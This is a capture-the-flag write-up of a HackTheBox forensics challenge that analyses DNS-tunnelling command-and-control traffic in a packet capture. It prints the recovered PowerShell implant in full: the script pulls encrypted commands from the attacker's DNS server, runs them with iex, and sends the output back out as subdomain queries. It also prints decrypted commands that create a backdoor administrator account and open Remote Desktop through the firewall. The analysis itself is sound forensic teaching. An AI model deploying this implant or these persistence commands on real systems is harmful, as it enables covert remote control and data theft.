---
title: "HackTheBox - Automation"
author: DrLi
description: "Writeup of an easy-rated Forensics challenge from HackTheBox."
date: 2025-11-15 11:30:00 +0000
categories : [HackTheBox, Challenges]
tags: [hackthebox, forensics, pcap, dns-tunneling, aes-encryption, wireshark, malware-analysis]
img_path: /assets/img/HackTheBox/Challenges/Automation
image:
    path: /assets/img/HackTheBox/Challenges/forensics.png
---

<div align="center"><script src="https://tryhackme.com/badge/2794771"></script></div>

---

The Automation challenge from [HackTheBox](https://www.hackthebox.com/) is an easy-rated forensics challenge involving network traffic analysis of a sophisticated DNS tunneling attack. The challenge demonstrates how APT groups use encrypted DNS queries as a covert communication channel for command and control operations.

# Automate (HTB Easy)

# Description

<aside>
ðŸ’¡

Vinyrâ€™s threat intelligence is monitoring closely all APT groups from every possible galaxy, especially the most dangerous one, longhir. As stated by an anonymous threat intelligence officer, the malicious actors tend to automate their initial post-exploitation enumeration so they can have less on-keyboard time. You can find such an example in the provided network capture generated by a recent incident. Analyse it and find out what they are up to.

</aside>

# Given

we have a PCAP

inside we can find some HTTP and DNS packets 

investigating the DNS packets we can find these weird requests

```bash
â”Œâ”€â”€(drliã‰¿kali)-[/media/sf_kalisharedfolder]
â””â”€$ tshark -r capture.pcap \
  -Y "dns.flags.response == 0 && dns.qry.name contains \"windowsliveupdater.com\" && dns.qry.type == 1" \
  -T fields -e frame.number -e frame.time -e ip.src -e dns.qry.name > dns_queries.txt

                                                                                                                                                                                                                                            
â”Œâ”€â”€(drliã‰¿kali)-[/media/sf_kalisharedfolder]
â””â”€$ cat dns_queries.txt 
1921    May  4, 2022 11:42:15.455579000 EDT     10.0.2.15       windowsliveupdater.com
2071    May  4, 2022 11:42:17.528678000 EDT     10.0.2.15       start.windowsliveupdater.com
2073    May  4, 2022 11:42:17.715786000 EDT     10.0.2.15       CC1C9AC2958A2E63609272E2B4F8F436.windowsliveupdater.com
2077    May  4, 2022 11:42:17.920483000 EDT     10.0.2.15       32A806549B03AB7E4EB39771AEDA4A1B.windowsliveupdater.com
2080    May  4, 2022 11:42:18.060817000 EDT     10.0.2.15       C1006AC8A03F9776B08321BD6D5247BB.windowsliveupdater.com
2092    May  4, 2022 11:42:18.356706000 EDT     10.0.2.15       end.windowsliveupdater.com 
```

it looks like some encrypted data or something and since we are not sure we can look for something else

now in the HTTP export objects we can find these

![image.png](/assets/img/HackTheBox/Challenges/Automation/image.png)

we have a bunch of binaries and one image from the same domain we found those suspicious packets at 

so letâ€™s check the image and see what it is

![image.png](/assets/img/HackTheBox/Challenges/Automation/image1.png)

after decrypting the base64 payload we get this PowerShell script (instead of an image)

```powershell
 function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
     
        }
        else {
            $aesManaged.IV = $IV
     

        }
    }
    if ($key) {

        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Create-AesKey() {
  
    $aesManaged = Create-AesManagedObject $key $IV
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.BitConverter]::ToString($fullData).replace("-","")
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

filter parts($query) { $t = $_; 0..[math]::floor($t.length / $query) | % { $t.substring($query * $_, [math]::min($query, $t.length - $query * $_)) }} 
$key = "a1E4MUtycWswTmtrMHdqdg=="
$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;
for ($num = 0 ; $num -le $out.Length-2; $num++){
$encryptedString = $out[$num].Strings[0]
$backToPlainText = Decrypt-String $key $encryptedString
$output = iex $backToPlainText;$pr = Encrypt-String $key $output|parts 32
Resolve-DnsName -type A -DnsOnly start.windowsliveupdater.com -Server 147.182.172.189
for ($ans = 0; $ans -lt $pr.length-1; $ans++){
$domain = -join($pr[$ans],".windowsliveupdater.com")
Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
    }
Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
}
```

this script shows the encryption process for the DNS queries we found earlier 

at first it sends command in TXT records 

here is what happens

Step 1 â€” Collects data from the machine

**Step 2 â€” Encrypts it using AES-CBC**

**Step 3 â€” Encodes the encrypted data and a command into a DNS TXT request**

**Step 4 â€” Sends the TXT request to the attackerâ€™s DNS server**

first we need to extract the TXT records sent to the victim

```bash
â””â”€$ tshark -r capture.pcap -Y "dns.qry.type == 16" -T fields -e dns.txt 

Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=,hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=,58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=,eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru,BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=,vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=,M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh 
```

now using this script we can decrypt the payloads 

```python
#!/usr/bin/env python3
import base64
from Crypto.Cipher import AES

KEY_B64 = "a1E4MUtycWswTmtrMHdqdg=="   # your AES key
KEY = base64.b64decode(KEY_B64)

def decrypt_chunk(b64data):
    # decode base64
    raw = base64.b64decode(b64data)

    # extract iv + ciphertext
    iv = raw[:16]
    ct = raw[16:]

    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    pt = cipher.decrypt(ct)

    return pt

def main():
    with open("chunks.txt", "r") as f:
        line = f.read().strip()

    chunks = line.split(",")

    full_plaintext = b""

    for c in chunks:
        if not c:
            continue
        try:
            full_plaintext += decrypt_chunk(c)
        except Exception as e:
            print(f"[!] Error decrypting chunk: {c}")
            print(e)

    # remove zero padding
    full_plaintext = full_plaintext.rstrip(b"\x00")

    print("\n===== DECRYPTED DATA =====")
    try:
        print(full_plaintext.decode("utf-8", errors="ignore"))
    except:
        print(full_plaintext)

if __name__ == "__main__":
    main()
```

here is the output

```bash
â”Œâ”€â”€(drliã‰¿kali)-[/media/sf_kalisharedfolder]
â””â”€$ python3 dec_dns.py                                                 

===== DECRYPTED DATA =====
hostnamewhoamiipconfigwmic /namespace:\\root\SecurityCenter PATH AntiVirusProduct GET /valuenet user DefaultUsr "JHBhcnQxPSdIVEJ7eTB1X2M0bl8n" /add /Y; net localgroup Administrators /add DefaultUsr; net localgroup "Remote Desktop Users" /add DefaultUsrnetsh advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389net start TermService
```

here is what happened

```bash
hostname
whoami
ipconfig
wmic /namespace:\\root\SecurityCenter PATH AntiVirusProduct GET /value
net user DefaultUsr "JHBhcnQxPSdIVEJ7eTB1X2M0bl8n" /add /Y; 
net localgroup Administrators /add DefaultUsr; 
net localgroup "Remote Desktop Users" /add DefaultUsr
netsh advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389
net start TermService
```

we got the first part of the flag

```bash
"JHBhcnQxPSdIVEJ7eTB1X2M0bl8n"  -->  $part1='HTB{y0u_c4n_'
```

now the next step is to see how the attacker receives the response of the commands he sent 

here is how it happens

1. Attacker Runs a Command on the Victim
2. Attacker Encrypts the Output of the Command

 3.  Attacker Converts Each Chunk to a Subdomain

 4.  The Attackerâ€™s DNS Server Logs All These Aâ€‘Record Requests

 5.  DNS Used as a â€œCovert Channelâ€

now letâ€™s get all the A records and decrypt them

```bash
â”Œâ”€â”€(drliã‰¿kali)-[/media/sf_kalisharedfolder]
â””â”€$ tshark -r capture.pcap \
  -Y "dns.flags.response == 0 && dns.qry.name contains \"windowsliveupdater.com\" && dns.qry.type == 1" \
  -T fields -e frame.number -e frame.time -e ip.src -e dns.qry.name > dns_queries.txt

                                                                                                                                                                                                                                            
â”Œâ”€â”€(drliã‰¿kali)-[/media/sf_kalisharedfolder]
â””â”€$ cat dns_queries.txt 
1921    May  4, 2022 11:42:15.455579000 EDT     10.0.2.15       windowsliveupdater.com
2071    May  4, 2022 11:42:17.528678000 EDT     10.0.2.15       start.windowsliveupdater.com
2073    May  4, 2022 11:42:17.715786000 EDT     10.0.2.15       CC1C9AC2958A2E63609272E2B4F8F436.windowsliveupdater.com
2077    May  4, 2022 11:42:17.920483000 EDT     10.0.2.15       32A806549B03AB7E4EB39771AEDA4A1B.windowsliveupdater.com
2080    May  4, 2022 11:42:18.060817000 EDT     10.0.2.15       C1006AC8A03F9776B08321BD6D5247BB.windowsliveupdater.com
2092    May  4, 2022 11:42:18.356706000 EDT     10.0.2.15       end.windowsliveupdater.com
2094    May  4, 2022 11:42:18.652920000 EDT     10.0.2.15       start.windowsliveupdater.com
2096    May  4, 2022 11:42:18.798260000 EDT     10.0.2.15       7679895D1CF7C07BB6A348E1AA4AFC65.windowsliveupdater.com
2098    May  4, 2022 11:42:19.062760000 EDT     10.0.2.15       5958A6856F1A34AAD5E97EA55B087670.windowsliveupdater.com
2100    May  4, 2022 11:42:19.434607000 EDT     10.0.2.15       35F2497E5836EA0ECA1F1280F59742A3.windowsliveupdater.com
2102    May  4, 2022 11:42:19.775076000 EDT     10.0.2.15       end.windowsliveupdater.com
2104    May  4, 2022 11:42:20.151970000 EDT     10.0.2.15       start.windowsliveupdater.com
2112    May  4, 2022 11:42:20.413015000 EDT     10.0.2.15       09E28DD82C14BC32513652DAC2F2C27B.windowsliveupdater.com
2123    May  4, 2022 11:42:20.755263000 EDT     10.0.2.15       0D73A3288A980D8FCEF94BDDCF9E2822.windowsliveupdater.com
2130    May  4, 2022 11:42:20.986008000 EDT     10.0.2.15       2A1CA17BB2D90FCD6158856348790414.windowsliveupdater.com
2133    May  4, 2022 11:42:21.177568000 EDT     10.0.2.15       20FC39C684A9E371CC3A06542B666005.windowsliveupdater.com
2143    May  4, 2022 11:42:21.343845000 EDT     10.0.2.15       5840BD94CCE65E23613925B4D9D2BA53.windowsliveupdater.com
2146    May  4, 2022 11:42:21.599314000 EDT     10.0.2.15       18EA75BC653004D45D505ED62567017A.windowsliveupdater.com
2149    May  4, 2022 11:42:21.790364000 EDT     10.0.2.15       6FA4E7593D83092F67A81082D9930E99.windowsliveupdater.com
2151    May  4, 2022 11:42:22.021008000 EDT     10.0.2.15       BA20E34AACC4774F067442C6622F5DA2.windowsliveupdater.com
2485    May  4, 2022 11:42:22.330141000 EDT     10.0.2.15       A9B09FF558A8DF000ECBD37804CE663E.windowsliveupdater.com
2487    May  4, 2022 11:42:22.532305000 EDT     10.0.2.15       3521599BC7591005AB6799C57068CF0D.windowsliveupdater.com
2489    May  4, 2022 11:42:22.913643000 EDT     10.0.2.15       C6884CECF01C0CD44FD6B82DB788B35D.windowsliveupdater.com
2491    May  4, 2022 11:42:23.172245000 EDT     10.0.2.15       62F02E4CAA1D973FBECC235AE9F40254.windowsliveupdater.com
2493    May  4, 2022 11:42:23.329710000 EDT     10.0.2.15       C63D3C93C89930DA2C4F42D9FC123D8B.windowsliveupdater.com
2495    May  4, 2022 11:42:23.646153000 EDT     10.0.2.15       AB00ACAB5198AFCC8C6ACD81B19CD264.windowsliveupdater.com
2497    May  4, 2022 11:42:23.883405000 EDT     10.0.2.15       CC6353668CEA4C88C8AEEA1D58980022.windowsliveupdater.com
2597    May  4, 2022 11:42:24.133572000 EDT     10.0.2.15       DA8FA2E917F17C28608818BF550FEA66.windowsliveupdater.com
2599    May  4, 2022 11:42:24.391749000 EDT     10.0.2.15       973B5A8355258AB0AA281AD88F5B9EB1.windowsliveupdater.com
2601    May  4, 2022 11:42:24.782337000 EDT     10.0.2.15       03AC666FE09A1D449736335C09484D27.windowsliveupdater.com
2603    May  4, 2022 11:42:25.153883000 EDT     10.0.2.15       1C301C6D5780AB2C9FA333BE3B0185BF.windowsliveupdater.com
2605    May  4, 2022 11:42:25.298492000 EDT     10.0.2.15       071FB1205C4DBEAA2241168B0748902A.windowsliveupdater.com
2610    May  4, 2022 11:42:25.513219000 EDT     10.0.2.15       6CE14903C7C47E7C87311044CB9873A4.windowsliveupdater.com
2637    May  4, 2022 11:42:25.787203000 EDT     10.0.2.15       end.windowsliveupdater.com
2645    May  4, 2022 11:42:26.229543000 EDT     10.0.2.15       start.windowsliveupdater.com
2647    May  4, 2022 11:42:26.459522000 EDT     10.0.2.15       ECABC349D27C0B0FFFD1ACEEDBE06BB6.windowsliveupdater.com
2649    May  4, 2022 11:42:26.686494000 EDT     10.0.2.15       C2EB000EE4F9B35D6F001500E85642A2.windowsliveupdater.com
2651    May  4, 2022 11:42:26.889673000 EDT     10.0.2.15       DCC8F1BE2CF4D667F458C1DE46D24B1C.windowsliveupdater.com
2653    May  4, 2022 11:42:27.087640000 EDT     10.0.2.15       2E0F5D94E52649C70402C1B0A2FF7B49.windowsliveupdater.com
2742    May  4, 2022 11:42:27.313495000 EDT     10.0.2.15       FC32DDD67F275307A74B2C4D0864B3F0.windowsliveupdater.com
2879    May  4, 2022 11:42:27.628674000 EDT     10.0.2.15       486186DA9443EB747F717B3911C959DC.windowsliveupdater.com
2881    May  4, 2022 11:42:27.830170000 EDT     10.0.2.15       7E300844D60655410C3988238E615D61.windowsliveupdater.com
2883    May  4, 2022 11:42:28.076237000 EDT     10.0.2.15       6F33D27F63CE4D1E065A416911BC50D4.windowsliveupdater.com
2895    May  4, 2022 11:42:28.378398000 EDT     10.0.2.15       58749599D2CB08DB561988EB2902E05D.windowsliveupdater.com
2897    May  4, 2022 11:42:28.595915000 EDT     10.0.2.15       9886FDDAC2BED6F6DA73637AD2F20CF1.windowsliveupdater.com
3099    May  4, 2022 11:42:28.767314000 EDT     10.0.2.15       99B8CE3D9DEE03C0180C7D1198B49C02.windowsliveupdater.com
3646    May  4, 2022 11:42:29.780818000 EDT     10.0.2.15       99B8CE3D9DEE03C0180C7D1198B49C02.windowsliveupdater.com
3648    May  4, 2022 11:42:30.012589000 EDT     10.0.2.15       769E5EE4EAB896D7D3BB478EA1408167.windowsliveupdater.com
3680    May  4, 2022 11:42:31.008731000 EDT     10.0.2.15       769E5EE4EAB896D7D3BB478EA1408167.windowsliveupdater.com
3688    May  4, 2022 11:42:31.237553000 EDT     10.0.2.15       79472A243BFB0852AF372323EC132988.windowsliveupdater.com
3690    May  4, 2022 11:42:31.657702000 EDT     10.0.2.15       3C81A3F2AEB1D3DAAE8496E1DBF97F43.windowsliveupdater.com
3696    May  4, 2022 11:42:32.000705000 EDT     10.0.2.15       5AE40A09203B890C4A174D77CB7026C4.windowsliveupdater.com
3700    May  4, 2022 11:42:32.141671000 EDT     10.0.2.15       E990A6FB6424A7501823AD31D3D6B634.windowsliveupdater.com
3889    May  4, 2022 11:42:32.281906000 EDT     10.0.2.15       4C7971C8D447C078C4471732AD881C39.windowsliveupdater.com
3893    May  4, 2022 11:42:32.561803000 EDT     10.0.2.15       4BC8B1A66E0BED43DDC359269B57D1D5.windowsliveupdater.com
3896    May  4, 2022 11:42:32.780406000 EDT     10.0.2.15       D68DCD2A608BF61716BB47D6FE4D5C9D.windowsliveupdater.com
3898    May  4, 2022 11:42:32.991431000 EDT     10.0.2.15       6E8BB2981F214A8234B0DD0210CA96EB.windowsliveupdater.com
3900    May  4, 2022 11:42:33.195653000 EDT     10.0.2.15       2D6322B0F7F3D748C4C9F8B80EFF5A69.windowsliveupdater.com
3902    May  4, 2022 11:42:33.335977000 EDT     10.0.2.15       21A3D1A8621A49F4D29BC9851D25230B.windowsliveupdater.com
3904    May  4, 2022 11:42:33.479823000 EDT     10.0.2.15       end.windowsliveupdater.com
3957    May  4, 2022 11:42:35.063169000 EDT     10.0.2.15       start.windowsliveupdater.com
3959    May  4, 2022 11:42:35.326596000 EDT     10.0.2.15       841BDB4E9E5F8BF721B58E8308177B57.windowsliveupdater.com
3961    May  4, 2022 11:42:36.307126000 EDT     10.0.2.15       2E9A015967DA5BF11AC9155FC2159C8F.windowsliveupdater.com
3963    May  4, 2022 11:42:37.136866000 EDT     10.0.2.15       610CD82F818B4BDF5E48722DAF4BEEEB.windowsliveupdater.com
3965    May  4, 2022 11:42:37.628450000 EDT     10.0.2.15       ABCE30583F503B484BF99020E28A1B8F.windowsliveupdater.com
3967    May  4, 2022 11:42:37.876952000 EDT     10.0.2.15       282A23FEB3A21C3AD89882F5AC0DD3D5.windowsliveupdater.com
3971    May  4, 2022 11:42:38.184427000 EDT     10.0.2.15       7D87875231652D0F4431EC37E51A09D5.windowsliveupdater.com
3975    May  4, 2022 11:42:38.398539000 EDT     10.0.2.15       7E2854D11003AB6E2F4BFB4F7E2477DA.windowsliveupdater.com
3977    May  4, 2022 11:42:38.860756000 EDT     10.0.2.15       A44FCA3BC6021777F03F139D458C0524.windowsliveupdater.com
3979    May  4, 2022 11:42:39.033967000 EDT     10.0.2.15       end.windowsliveupdater.com
4778    May  4, 2022 11:42:41.825003000 EDT     10.0.2.15       start.windowsliveupdater.com
4780    May  4, 2022 11:42:42.031662000 EDT     10.0.2.15       AE4ABE8A3A88D21DEEA071A72D65A35E.windowsliveupdater.com
4782    May  4, 2022 11:42:42.250392000 EDT     10.0.2.15       F158D9F025897D1843E37B7463EC7833.windowsliveupdater.com
4796    May  4, 2022 11:42:42.735680000 EDT     10.0.2.15       end.windowsliveupdater.com
```

here a script to decrypt them

```python
import base64
from Crypto.Cipher import AES

def decrypt_chunks(hex_chunks, key_b64):
    # Convert chunks from hex strings â†’ bytes
    ciphertext = bytes.fromhex("".join(hex_chunks))

    # Decode key (base64 â†’ bytes)
    key = base64.b64decode(key_b64)

    # Extract IV (first 16 bytes)
    iv = ciphertext[:16]

    # Remaining bytes = AES ciphertext
    encrypted = ciphertext[16:]

    # AES CBC decrypt
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted)

    # Zeroâ€‘padding removal
    decrypted = decrypted.rstrip(b"\x00")

    return decrypted.decode("utf-8", errors="ignore")

def load_chunks_from_file(path):
    chunks = []
    with open(path, "r") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue

            # strip domain suffix if present
            if ".windowsliveupdater.com" in line:
                line = line.split(".")[0]

            chunks.append(line)
    return chunks

if __name__ == "__main__":

    key = "a1E4MUtycWswTmtrMHdqdg=="   # From the PowerShell script

    print("[*] Reading chunks from subdomains.txt ...")
    chunks = load_chunks_from_file("subdomains.txt")

    print(f"[*] Loaded {len(chunks)} chunks.")
    print("[*] Reassembling & decrypting...")

    try:
        plaintext = decrypt_chunks(chunks, key)
        print("\n===== DECRYPTED DATA =====")
        print(plaintext)
    except Exception as e:
        print("\n[!] ERROR:", e)
```

we get this 

```bash
â”Œâ”€â”€(drliã‰¿kali)-[/media/sf_kalisharedfolder]
â””â”€$ python3 dec_A_records.py
[*] Reading chunks from subdomains.txt ...
[*] Loaded 61 chunks.
[*] Reassembling & decrypting...

===== DECRYPTED DATA =====
intergalacticopcenterãµ°n>~8Òžintergalacticop\sysadmineÆ‰zgJR Windows IP Configuration   Ethernet adapter Ethernet:     Connection-specific DNS Suffix  . : home    Link-local IPv6 Address . . . . . : fe80::fdbd:2c54:d6b:c384%6    IPv4 Address. . . . . . . . . . . : 10.0.2.15    Subnet Mask . . . . . . . . . . . : 255.255.255.0    Default Gateway . . . . . . . . . : 10.0.2.2nmy 9(@    companyName=Panaman  displayName=Pan Antivirus 4.0, $part2=4utom4t3_but_y0u_c4nt_h1de}  instanceGuid={CD3EA3C2-91CB-4359-90DC-1E909147B6B0}  onAccessScannin!Q]<3E,}
$(gEnabled=TRUE  pc:sh|=athToSignedProductExe=panantivirus://  productHasNotifiedUser=  productState=  productUptoDate=TRUE  productWantsWscNotifications=  versionNumber=4.0.0.1       
                                                                                                                                                                                        =w:^The command completed successfully.  The command completed successfully.  The command completed successfully. ?
                                                               G0DVvÏ«3Ok. 
```

the complete flag is:

```python
HTB{y0u_c4n_4utom4t3_but_y0u_c4nt_h1de}
```

DONE!